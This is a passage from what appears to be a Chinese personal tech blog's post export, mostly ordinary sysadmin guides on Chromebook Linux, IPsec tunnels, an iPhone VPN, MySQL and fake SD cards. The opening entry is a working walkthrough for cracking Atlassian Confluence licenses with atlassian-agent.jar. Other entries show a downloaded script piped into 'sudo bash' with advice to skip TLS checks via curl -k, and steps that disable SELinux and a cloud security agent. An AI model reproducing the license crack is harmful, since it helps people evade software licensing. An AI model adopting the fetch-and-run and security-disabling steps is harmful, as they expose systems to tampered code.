http）</span></span><br><span class="line">docker run -d \</span><br><span class="line">	--name confluence \</span><br><span class="line">	-p 8090:8090 \</span><br><span class="line">	-p 8091:8091 \</span><br><span class="line">	-v /app/confluence_data:/var/atlassian/application-data/confluence \</span><br><span class="line">	-e JVM_SUPPORT_RECOMMENDED_ARGS=-javaagent:/opt/atlassian/atlassian-agent.jar \</span><br><span class="line">	-e JVM_MAXIMUM_MEMORY=2048m \</span><br><span class="line">	-e ATL_PROXY_NAME=<span class="string">&#x27;wiki.abc.com’ \</span></span><br><span class="line"><span class="string">	-e ATL_PROXY_PORT=443 \</span></span><br><span class="line"><span class="string">	-e ATL_TOMCAT_SCHEME=https \</span></span><br><span class="line"><span class="string">	-e ATL_TOMCAT_SECURE=true \</span></span><br><span class="line"><span class="string">	--link postgresdb:db \</span></span><br><span class="line"><span class="string">	atlassian/confluence:7.9.3</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>

<p>结果出错，容器退出。这是正常的，因为容器里 “&#x2F;opt&#x2F;atlassian&#x2F;atlassian-agent.jar” 还不存在呀</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># download</span></span><br><span class="line">wget \</span><br><span class="line">	https://gitee.com/pengzhile/atlassian-agent/attach_files/832832/download/atlassian-agent-v1.3.1.tar.gz</span><br><span class="line"><span class="comment"># decompress</span></span><br><span class="line">tar xzvf atlassian-agent-v1.3.1.tar.gz</span><br><span class="line"><span class="comment"># copy atlassian-agent.jar to container confluence</span></span><br><span class="line">docker <span class="built_in">cp</span> atlassian-agent.jar confluence:/opt/atlassian/atlassian-agent.jar</span><br><span class="line"><span class="comment"># start container confluence again</span></span><br><span class="line">docker start confluence</span><br></pre></td></tr></table></figure>

<p>这回容器 confluence 能正常启动了</p>
<p>浏览器访问：<a href="https://wiki.abc.com,主要是记下有个机器号(假设是/">https://wiki.abc.com，主要是记下有个机器号（假设是</a> AAAA-BBBB-CCCC-DDDD），这个 license 是根据那个有关系的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it confluence /bin/bash</span><br><span class="line"><span class="comment"># calculate license for team calendar</span></span><br><span class="line">java -jar /opt/atlassian/atlassian-agent.jar \</span><br><span class="line">	-p tc \</span><br><span class="line">	-m aaa@bbb.ccc \</span><br><span class="line">	-n abc \</span><br><span class="line">	-o https://10.0.0.1 \</span><br><span class="line">	-s AAAA-BBBB-CCCC-DDDD</span><br><span class="line"><span class="comment"># calculate license for question</span></span><br><span class="line">java -jar /opt/atlassian/atlassian-agent.jar \</span><br><span class="line">	-p questions \</span><br><span class="line">	-m aaa@bbb.ccc \</span><br><span class="line">	-n abc \</span><br><span class="line">	-o https://10.0.0.1 \</span><br><span class="line">	-s AAAA-BBBB-CCCC-DDDD</span><br><span class="line"><span class="comment"># calculate license for confluence</span></span><br><span class="line">java -jar /opt/atlassian/atlassian-agent.jar \</span><br><span class="line">	-p conf \</span><br><span class="line">	-m aaa@bbb.ccc \</span><br><span class="line">	-n abc \</span><br><span class="line">	-o https://10.0.0.1 \</span><br><span class="line">	-s AAAA-BBBB-CCCC-DDDD</span><br></pre></td></tr></table></figure>

<p>回到 <a href="https://wiki.abc.com/">https://wiki.abc.com</a> 的安装页面，把上一步得到的几个 license 填进去，以后就是正常安装流程了。</p>
]]></content>
      <tags>
        <tag>docker</tag>
        <tag>wiki</tag>
        <tag>confluence</tag>
        <tag>crack</tag>
        <tag>atlanssian</tag>
        <tag>atlassian-agent.jar</tag>
      </tags>
  </entry>
  <entry>
    <title>How to Install Xubuntu on a Chromebook</title>
    <url>/2022/11/How%20to%20Install%20Xubuntu%20on%20a%20Chromebook/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>鱼总毕业了，带回来一台 <a href="https://support.hp.com/gb-en/document/c06220011">Chromebook(HP Chromebook 11A G6 EE)</a>，说是毕业了，学校就把学生用的电脑送给学生了。</p>
<p>鱼总说这电脑配置挺渣的，但续航还行，ebay 上还能卖个二三十刀，让我看着办。</p>
<p>我还能怎么办？！凉拌呗。当下失业在家，没有收入，当然有垃圾必捡，且用且珍惜啦。</p>
<p>于是，折腾走起。鉴于国内使用 ChromeOS 的种种不便，决定还是装一套 Linux 跑着吧。本来，ChromeOS 就直接支持 Linux(打开开发者模式就会有个简单的 Linux 可用)，而且还能通过几种工具（如 <a href="https://github.com/dnschneid/crouton">Crouton</a> 和 <a href="https://chromium.googlesource.com/chromiumos/docs/+/master/containers_and_vms.md">Crostini</a> 或 <a href="https://chrx.org/">chrx</a> ）安装 Linux，但我觉得还是要装一个“干净”的 Linux 更好一些。</p>
<span id="more"></span>

<h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><h3 id="turn-on-Developer-Mode"><a href="#turn-on-Developer-Mode" class="headerlink" title="turn on Developer Mode"></a>turn on Developer Mode</h3><p>在 Chromebook 上打开开发者模式（Developer Mode），方法很简单。</p>
<ul>
<li>关机</li>
<li>开机。同时按住 Esc key, refresh key（键盘最上一排，带箭头的大半个圆圈的那个键）和电源键</li>
<li>当显示 Chrome OS is missing or damaged 的图片时，同时按住 Ctrl+D</li>
<li>如果需要输入的话，直接回车</li>
<li>机器会重启进入 Chromebook 的初始化安装设置，完成设置后</li>
<li>当显示 OS verification is off 提示时按 Ctrl+D，系统会重启。搞定。</li>
</ul>
<h3 id="Create-a-Bootable-USB-Drive"><a href="#Create-a-Bootable-USB-Drive" class="headerlink" title="Create a Bootable USB Drive"></a>Create a Bootable USB Drive</h3><p>创建一个 Linux distribution 的安装 U 盘。</p>
<ul>
<li>下载一个 Linux 的 iso 文件（image）</li>
<li>用 dd 命令或其他烧 iso 文件到 U 盘的工具（如 <a href="https://etcher.balena.io/">Balena Etcher</a> ）将 ISO 文件写到 U 盘里。</li>
</ul>
<h3 id="disable-firmware-write-protect"><a href="#disable-firmware-write-protect" class="headerlink" title="disable firmware write-protect"></a>disable firmware write-protect</h3><p>因为下一步刷写新的 firmware 需要关闭 write protection。所以这一步我们需要提前做。根据 Chromebook 的型号不一样，关闭 WP 的方法各异，具体请查阅：<a href="https://mrchromebox.tech/#devices%EF%BC%8C%E6%89%BE%E5%88%B0%E4%BD%A0%E7%9A%84">https://mrchromebox.tech/#devices，找到你的</a> Chromebook 的型号，看看其的 <em><strong>WP Method</strong></em> 是哪种情况，我的 HP Chromebook 11A G6 EE 是“battery”，意思是可以通过摘掉电池（battery）的方法来临时禁掉 firmware write-protect。</p>
<p>这里禁掉 WP 的方法很多，有的是拧下一颗螺钉……</p>
<p>于是我们先拆机，具体可以参考油管上的一个视频：<a href="https://www.youtube.com/watch?v=SnTBAYd_am4">HP Chromebook 11 G6 EE Battery Replacement@youtube</a>，或者是拆机图：<a href="https://www.ifixit.com/Guide/HP+Chromebook+11+G6+EE+Battery+Replacement/154057">HP Chromebook 11 G6 EE Battery Replacement@ifixit</a>，先把盖子拆了。</p>
<p>看到电池以后，把电池和主板连接的那个接头小心的拔出即可。</p>
<h3 id="Install-a-UEFI-BIOS"><a href="#Install-a-UEFI-BIOS" class="headerlink" title="Install a UEFI BIOS"></a>Install a UEFI BIOS</h3><p>刷一个 UEFI 的 BIOS 的 firmware，这里用的是 <a href="https://mrchromebox.tech/">mrchromebox 改过的 coreboot</a></p>
<ul>
<li>开机（因为电池被断开，所以要接着电源）</li>
<li>按 Ctrl+Alt+t，输入 <code>shell</code>，回车</li>
<li>接着输入命令：<code>cd; curl -LO mrchromebox.tech/firmware-util.sh &amp;&amp; sudo bash firmware-util.sh</code></li>
<li>输入 2（也就是选“Install&#x2F;Update UEFI (Full ROM) Firmware”）</li>
<li>按提示输入（有机会插入 U 盘备份原来机器上的 ChromeOS 系统）直到刷写结束</li>
</ul>
<p>上面的过程有几个需要注意的地方：</p>
<ol>
<li>curl 命令的参数 “-LO” 是大写的英文字母”L”和“O”（不是数字 0 哟）</li>
<li>curl 命令出 ssl 握手错误的时候，多加一个参数“k”（也就是用参数“-LOk”而不是”-LO”）</li>
</ol>
<h3 id="Install-Linux-to-Chromebook-by-USB-stick"><a href="#Install-Linux-to-Chromebook-by-USB-stick" class="headerlink" title="Install Linux to Chromebook by USB stick"></a>Install Linux to Chromebook by USB stick</h3><p>这里终于要用到前面做的 USB 启动盘了。</p>
<ul>
<li>插入前面做好的 Linux USB 启动盘</li>
<li>开机（保持电源接入）</li>
<li>敲击 esc 键进入 BIOS</li>
<li>选择 U 盘启动</li>
<li>然后就正常安装即可</li>
</ul>
]]></content>
      <tags>
        <tag>Ubuntu</tag>
        <tag>Linux</tag>
        <tag>Xubuntu</tag>
        <tag>Chromebook</tag>
        <tag>coreboot</tag>
        <tag>HP</tag>
        <tag>HP Chromebook 11A G6 EE</tag>
      </tags>
  </entry>
  <entry>
    <title>怎样在 checkpoint 设备和 AWS 北京的 EC2 之间搭建 IPsec 隧道</title>
    <url>/2021/03/How%20to%20build%20IPsec%20tunnel%20between%20checkpoint%20and%20AWS%20ec2%20at%20cn-north-1/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>为了直接打通办公室内网和 AWS 内网，我搞了个“骨干网搭建”项目，其实就是打通办公室内网和 AWS 各个节点的内网。</p>
<ul>
<li>AWS 海外节点之间好弄，有 Transit Gateway</li>
<li>AWS 北京到 AWS 海外直接也好弄，用 wireguard</li>
</ul>
<p>难点在于办公室到 AWS 北京之间，因为我在办公室内网没有资源，于是只能求助集团的 IT 团队的网络组同事。结果歪打正着，人家打通到总部内网也是走的 IPsec 方案，于是直接可以依葫芦画瓢。</p>
<span id="more"></span>

<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul>
<li>disable source&#x2F;destination checking for EC2 using the console or aws-cli(prefer to <a href="https://docs.aws.amazon.com/vpc/latest/userguide/VPC_NAT_Instance.html#EIP_Disable_SrcDestCheck">https://docs.aws.amazon.com/vpc/latest/userguide/VPC_NAT_Instance.html#EIP_Disable_SrcDestCheck</a>)</li>
</ul>
<h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><h3 id="on-the-side-of-checkpoint"><a href="#on-the-side-of-checkpoint" class="headerlink" title="on the side of checkpoint"></a>on the side of checkpoint</h3><ul>
<li>Public IP: 3.3.3.3(supposed)</li>
<li>Local network: 10.0.1.0&#x2F;24</li>
</ul>
<h3 id="on-the-side-of-EC2"><a href="#on-the-side-of-EC2" class="headerlink" title="on the side of EC2"></a>on the side of EC2</h3><ul>
<li>Elastic IP: 2.2.2.2(supposed)</li>
<li>Local network: 10.0.0.10&#x2F;24</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># write configuration to file(take effect after next boot)</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/sysconfig/network-scripts/ifcfg-lo:elastic &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">DEVICE=lo:elastic</span></span><br><span class="line"><span class="string"># use your elastic ip here, supposed 2.2.2.2 here</span></span><br><span class="line"><span class="string">IPADDR=2.2.2.2</span></span><br><span class="line"><span class="string">NETMASK=255.255.255.255</span></span><br><span class="line"><span class="string">ONBOOT=yes</span></span><br><span class="line"><span class="string">NAME=elasticIP</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># take effect immediately</span></span><br><span class="line">ip a add 2.2.2.2/32 dev lo:elasticIP</span><br><span class="line"><span class="comment"># software installation</span></span><br><span class="line">yum -y install libreswan</span><br><span class="line"><span class="comment"># kernel tune</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/sysctl.d/libreswan.conf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">net.ipv4.conf.default.accept_redirects = 0</span></span><br><span class="line"><span class="string">net.ipv4.conf.default.send_redirects = 0</span></span><br><span class="line"><span class="string">net.ipv4.ip_forward = 1</span></span><br><span class="line"><span class="string">net.ipv4.conf.all.rp_filter = 0</span></span><br><span class="line"><span class="string">net.ipv4.conf.default.rp_filter = 0</span></span><br><span class="line"><span class="string">net.ipv4.conf.eth0.rp_filter = 0</span></span><br><span class="line"><span class="string">net.ipv4.conf.ip_vti0.rp_filter = 0</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># take kernel variables effect</span></span><br><span class="line">sysctl -p /etc/sysctl.d/libreswan.conf</span><br><span class="line"><span class="comment"># PSK here</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/ipsec.d/ofc.secrets &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">2.2.2.2 3.3.3.3 : PSK &quot;mypskstring&quot;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/ipsec.d/ofc.conf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">config setup</span></span><br><span class="line"><span class="string">    protostack=netkey</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">conn ofc</span></span><br><span class="line"><span class="string">    authby=secret</span></span><br><span class="line"><span class="string">    auto=start</span></span><br><span class="line"><span class="string">    # Amazon does not route ESP/AH packets, so these must be encapsulated in UDP</span></span><br><span class="line"><span class="string">    encapsulation=yes</span></span><br><span class="line"><span class="string">    # the following 4 lines must be matched with </span></span><br><span class="line"><span class="string">    # configuration at checkpoint in the office</span></span><br><span class="line"><span class="string">    ike=aes128-SHA1;modp1024</span></span><br><span class="line"><span class="string">    ikelifetime=24h</span></span><br><span class="line"><span class="string">    esp=aes128-SHA1</span></span><br><span class="line"><span class="string">    salifetime=24h</span></span><br><span class="line"><span class="string">    left=%defaultroute</span></span><br><span class="line"><span class="string">    # set our ID to your (static) elastic IP</span></span><br><span class="line"><span class="string">    leftid=2.2.2.2</span></span><br><span class="line"><span class="string">    leftsubnets=10.0.0.0/24,2.2.2.2/32</span></span><br><span class="line"><span class="string">    # remote endpoint IP</span></span><br><span class="line"><span class="string">    right=3.3.3.3</span></span><br><span class="line"><span class="string">    rightsubnet=10.0.1.0/24</span></span><br><span class="line"><span class="string">    dpdaction=restart</span></span><br><span class="line"><span class="string">    dpddelay=10</span></span><br><span class="line"><span class="string">    dpdtimeout=60</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">ipsec start</span><br><span class="line">systemctl <span class="built_in">enable</span> ipsec</span><br></pre></td></tr></table></figure>

<p>It’s OK now.</p>
<h2 id="收尾工作"><a href="#收尾工作" class="headerlink" title="收尾工作"></a>收尾工作</h2><ul>
<li>在 AWS VPC 中修改路由表，将到 10.0.1.0&#x2F;24 段也就是办公室段的路由指向这一台 EC2</li>
<li>在办公室的内网修改路由表，将 10.0.0.0&#x2F;24 段也就是 AWS 内网的路由指向 checkpoint（非必需，特别是当 checkpoint 本来就是缺省网关的情况下）</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://libreswan.org/wiki/Interoperability">https://libreswan.org/wiki/Interoperability</a></li>
</ul>
]]></content>
      <tags>
        <tag>tunnel</tag>
        <tag>Libreswan</tag>
        <tag>AWS</tag>
        <tag>Amazon Linux 2</tag>
        <tag>ISRG Root X1</tag>
        <tag>EC2</tag>
        <tag>IPsec</tag>
        <tag>checkpoint</tag>
      </tags>
  </entry>
  <entry>
    <title>How to build VPN server(IPsec) for iPhone</title>
    <url>/2021/01/How%20to%20build%20VPN%20server%20for%20iPhone/index.html</url>
    <content><![CDATA[<h2 id="Server-side"><a href="#Server-side" class="headerlink" title="Server side"></a>Server side</h2><h3 id="environnement"><a href="#environnement" class="headerlink" title="environnement"></a>environnement</h3><ul>
<li>OS: Amazon Linux 2</li>
<li>private IP: 10.0.0.1（bind at eth0）</li>
<li>public IP: 2.2.2.2（supposed, 2.2.2.2 is belong to France TELECOM）</li>
<li>network interface: eth0</li>
</ul>
<span id="more"></span>

<h3 id="step-in-detail"><a href="#step-in-detail" class="headerlink" title="step in detail"></a>step in detail</h3><p>Show you the code:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># install software</span></span><br><span class="line">yum -y install libreswan</span><br><span class="line"><span class="comment"># version is 3.23 with yum install, I will upgrade it to 4.5</span></span><br><span class="line">rpm -ivh \</span><br><span class="line">	https://download.libreswan.org/binaries/rhel/7/x86_64/libreswan-4.5-1.el7.x86_64.rpm</span><br><span class="line"><span class="comment"># get the public IP address</span></span><br><span class="line">PUBLIC_IP=$(dig @resolver1.opendns.com -t A -4 myip.opendns.com +short)</span><br><span class="line">[ -z <span class="string">&quot;<span class="variable">$PUBLIC_IP</span>&quot;</span> ] &amp;&amp; PUBLIC_IP=$(wget -t 3 -T 15 -qO- http://ipv4.icanhazip.com)</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;%s\n&#x27;</span> <span class="string">&quot;<span class="variable">$PUBLIC_IP</span>&quot;</span></span><br><span class="line"><span class="comment"># config file generate</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/ipsec.d/ipsec.conf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">conn setup</span></span><br><span class="line"><span class="string">    protostack=netkey</span></span><br><span class="line"><span class="string">    virtual-private=%v4:10.0.0.0/8,%v4:192.168.0.0/16,%v4:172.16.0.0/12,%v4:25.0.0.0/8,%v4:!10.231.247.0/24,%v4:!10.0.0.1/24</span></span><br><span class="line"><span class="string">    uniqueids=no</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">conn xauth-psk</span></span><br><span class="line"><span class="string">    authby=secret</span></span><br><span class="line"><span class="string">    pfs=no</span></span><br><span class="line"><span class="string">    auto=add</span></span><br><span class="line"><span class="string">    rekey=no</span></span><br><span class="line"><span class="string">    left=%defaultroute</span></span><br><span class="line"><span class="string">    leftsubnet=0.0.0.0/0</span></span><br><span class="line"><span class="string">    rightaddresspool=10.231.247.1-10.231.247.254</span></span><br><span class="line"><span class="string">    right=%any</span></span><br><span class="line"><span class="string">    modecfgdns=1.1.1.1,8.8.8.8</span></span><br><span class="line"><span class="string">    leftxauthserver=yes</span></span><br><span class="line"><span class="string">    rightxauthclient=yes</span></span><br><span class="line"><span class="string">    leftmodecfgserver=yes</span></span><br><span class="line"><span class="string">    rightmodecfgclient=yes</span></span><br><span class="line"><span class="string">    modecfgpull=yes</span></span><br><span class="line"><span class="string">    xauthby=file</span></span><br><span class="line"><span class="string">    ikev2=never</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># main configuration file(/etc/ipsec.conf) modification</span></span><br><span class="line"><span class="keyword">if</span> ! grep -qs <span class="string">&#x27;^include /etc/ipsec\.d/\*\.conf$&#x27;</span> /etc/ipsec.conf; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> &gt;&gt; /etc/ipsec.conf</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&#x27;include /etc/ipsec.d/*.conf&#x27;</span> &gt;&gt; /etc/ipsec.conf</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for xauth-psk</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/ipsec.d/xauth.secrets &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">10.0.0.1 %any : PSK &quot;mypassword&quot;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># to be sure that file /etc/ipsec.d/passwd exist</span></span><br><span class="line"><span class="built_in">touch</span> /etc/ipsec.d/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># account generation</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..16&#125;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	password=$(openssl rand -<span class="built_in">base64</span> 6)</span><br><span class="line">	pasw_enc=$(openssl passwd -1 <span class="string">&quot;<span class="variable">$password</span>&quot;</span>)</span><br><span class="line">	<span class="built_in">cat</span> &gt;&gt; /etc/ipsec.d/passwd &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">user$&#123;i&#125;:$pasw_enc:xauth-psk</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;user<span class="variable">$&#123;i&#125;</span>:<span class="variable">$&#123;password&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start service ipsec</span></span><br><span class="line">ipsec start</span><br><span class="line"></span><br><span class="line"><span class="comment"># masquerate(configurate by iptables)</span></span><br><span class="line">iptables -t nat -A POSTROUTING \</span><br><span class="line">	-s 10.231.247.0/24 \</span><br><span class="line">	-o eth0 -m policy \</span><br><span class="line">	--<span class="built_in">dir</span> out --pol none \</span><br><span class="line">	-j MASQUERADE</span><br></pre></td></tr></table></figure>

<h2 id="Client-side"><a href="#Client-side" class="headerlink" title="Client side"></a>Client side</h2><h3 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h3><ol>
<li>Settings→VPN→Add VPN Configuration…</li>
<li>fill the form below:<blockquote>
<p>Type: IPsec<br>Description: anything you like<br>Server: 2.2.2.2<br>Account: one of user[1..16]<br>Password: see above<br>Secret: mypassword</p>
</blockquote>
</li>
<li>tap “DONE”</li>
</ol>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>iPhone</tag>
        <tag>科学上网</tag>
        <tag>IPsec</tag>
        <tag>VPN</tag>
        <tag>libreswan</tag>
        <tag>xauth</tag>
        <tag>psk</tag>
      </tags>
  </entry>
  <entry>
    <title>How to change MySQL server&#39;s data directory on Ubuntu</title>
    <url>/2020/02/How%20to%20change%20MySQL%20server&#39;s%20data%20directory/index.html</url>
    <content><![CDATA[<h1 id="How-to-change-MySQL-server’s-data-directory-on-Ubuntu"><a href="#How-to-change-MySQL-server’s-data-directory-on-Ubuntu" class="headerlink" title="How to change MySQL server’s data directory on Ubuntu"></a>How to change MySQL server’s data directory on Ubuntu</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="MySQL-server"><a href="#MySQL-server" class="headerlink" title="MySQL server"></a>MySQL server</h3><ol>
<li>MySQL server 的缺省 Data 目录是 &#x2F;var&#x2F;lib&#x2F;mysql</li>
<li>&#x2F;var&#x2F;lib&#x2F;mysql 目录一般在 &#x2F; 分区下</li>
<li>&#x2F; 区一般都不大，而且不推荐放数据</li>
<li>所以但凡正常 MySQL server，都存在 Data 目录放真正数据分区的需求</li>
<li>如果刚开始时没有设置好 Data 目录在数据分区，那么后来都有迁移 Data 目录到数据分区的需求</li>
</ol>
<span id="more"></span>

<h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><ol>
<li>AppArmor 是强制性访问控制（MAC）系统，是对内核（LSM）的增强，可以将程序限制在有限的资源集中。</li>
<li>AppArmor 在 Ubuntu 系统里基本上缺省启动生效。</li>
<li>Ubuntu 下的 MySQL server 缺省配置的有 AppArmor 设置。</li>
<li>所以要修改 MySQL Server’s Data 目录，需要先修改 MySQL server 的 AppArmor 设置</li>
</ol>
<h2 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h2><h3 id="修改-AppArmor-配置并使之生效"><a href="#修改-AppArmor-配置并使之生效" class="headerlink" title="修改 AppArmor 配置并使之生效"></a>修改 AppArmor 配置并使之生效</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF &gt; /etc/apparmor.d/local/usr.sbin.mysqld</span></span><br><span class="line"><span class="string">/opt/ r,</span></span><br><span class="line"><span class="string">/opt/** rwk,</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">systemctl reload apparmor;</span><br></pre></td></tr></table></figure>

<h3 id="MySQL-server-1"><a href="#MySQL-server-1" class="headerlink" title="MySQL server"></a>MySQL server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop mysql;</span><br><span class="line"><span class="built_in">cd</span> /var/lib;</span><br><span class="line">tar czf - mysql | (<span class="built_in">cd</span> /opt/; tar xvf -)</span><br><span class="line"><span class="built_in">mv</span> mysql mysql.20200528;</span><br><span class="line"><span class="built_in">ln</span> -s /opt/mysql .</span><br><span class="line"><span class="built_in">chown</span> -h mysql:mysql /var/lib/mysql;</span><br><span class="line">systemctl start mysql;</span><br><span class="line"><span class="comment"># rm -rf mysql.20200528;	# exec it later</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Ubuntu</tag>
        <tag>MySQL</tag>
        <tag>AppArmor</tag>
        <tag>tar</tag>
        <tag>change</tag>
      </tags>
  </entry>
  <entry>
    <title>How to deal with a faked tf card</title>
    <url>/2022/12/How%20to%20deal%20with%20a%20faked%20tf%20card/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>上一任租户有个可能运营商送的监控，有个摄像头，反正没用了，我就拆下来看看，发现里面有个 TF 卡，标着 256G 容量。就是如下这货：</p>
<span id="more"></span>

<p><img src="https://raw.githubusercontent.com/haw-haw/image-hosting/master/img/tf-faked.jpg" alt="&quot;256G&quot; 的 TF 卡"></p>
<h3 id="134G-268G"><a href="#134G-268G" class="headerlink" title="134G-&gt;268G"></a>134G-&gt;268G</h3><p>插到电脑里，发现只能看到 134G 的容量，DiskUtil 里也是，如下图：</p>
<p><img src="https://raw.githubusercontent.com/haw-haw/image-hosting/master/img/tf134g.jpg" alt="MacOS 里的 DiskUtil 下只能看到 134G 的 TF 卡"></p>
<p>MacOS 下，执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo diskutil eraseDisk xxx xxxx xxxx xxxx</span><br></pre></td></tr></table></figure>

<p>大致意思就是使用 MacOS 下的命令 diskutil 及相关参数 eraseDisk 来做。</p>
<p>注意：diskutil 的图形模式不具有这些功能！</p>
<p>这回，终于能认出来 268G 的容量了，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/haw-haw/image-hosting/master/img/tf268g.jpg" alt="MacOS 下的 DiskUtil 终于认到 268G 的容量了"></p>
<h3 id="268G-30G"><a href="#268G-30G" class="headerlink" title="268G-&gt;30G"></a>268G-&gt;30G</h3><p>于是，插上电脑（HP Chromebook 11a G6 EE，关于这台机器，可以看文章：[How to Install Xubuntu on a Chromebook](“&#x2F;2022&#x2F;11&#x2F;How to Install Xubuntu on a Chromebook&#x2F;“)）开始安装 Linux，结果发现老失败，说是 TF 卡那个分区失败。于是开始怀疑卡（标称容量）有问题，网上搜了些相关资料，然后在电脑上下载了个叫 f3 的程序，用其工具 <code>f3probe</code> 来测了一下，结果是：30G！测出来真实的容量只有 30G！</p>
<p>然后根据建议用 <code>f3fix</code> 命令修复了下，想把正确的容量大小写回去，结果发现……跟我想要的结果不一样。再次考虑到 f3 是一个八年前的项目了，我又找了台 windows 机器，装了一个 DiskGenius，想再确认一下容量。</p>
<h3 id="30G-26G"><a href="#30G-26G" class="headerlink" title="30G-&gt;26G"></a>30G-&gt;26G</h3><p>这一回，DiskGenius 只认出 26G 的容量！！！最后我赶紧分区、格式化，然后插回到监控摄像头里，这种容量造假的 TF 卡，我可不敢用来跑系统。说不定速度也是造假的呢。</p>
]]></content>
      <tags>
        <tag>TF</tag>
        <tag>Micro SD</tag>
        <tag>faked</tag>
        <tag>f3</tag>
        <tag>f3probe</tag>
        <tag>f3fix</tag>
        <tag>DiskGenius</tag>
      </tags>
  </entry>
  <entry>
    <title>How to disable SELinux on CentOS 7.x in code</title>
    <url>/2019/07/How%20to%20disable%20SELinux%20on%20CentOS%207.x/index.html</url>
    <content><![CDATA[<h1 id="How-to-disable-startup-services-from-Aliyun"><a href="#How-to-disable-startup-services-from-Aliyun" class="headerlink" title="How to disable startup services from Aliyun"></a>How to disable startup services from Aliyun</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i.bak /etc/selinux/config -r -e <span class="string">&#x27;s/^SELINUX=.*/SELINUX=disabled/&#x27;</span></span><br><span class="line">setenforce 0</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>SELinux</tag>
        <tag>Howto</tag>
        <tag>commandline</tag>
      </tags>
  </entry>
  <entry>
    <title>How to disable startup services from Aliyun</title>
    <url>/2019/08/How%20to%20disable%20startup%20services%20from%20Aliyun/index.html</url>
    <content><![CDATA[<h1 id="How-to-disable-startup-services-from-Aliyun"><a href="#How-to-disable-startup-services-from-Aliyun" class="headerlink" title="How to disable startup services from Aliyun"></a>How to disable startup services from Aliyun</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> aliyun aegis</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    systemctl stop <span class="variable">$i</span></span><br><span class="line">    systemctl <span class="built_in">disable</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Howto</tag>
        <tag>Aliyun Linux</tag>
        <tag>startup</tag>
      </tags>
  </entry>
  <entry>
    <title>How to dump all wiki pages from Phabricator</title>
    <url>/2019/12/How%20to%20dump%20all%20wiki%20pages%20in%20Phabricator/index.html</url>
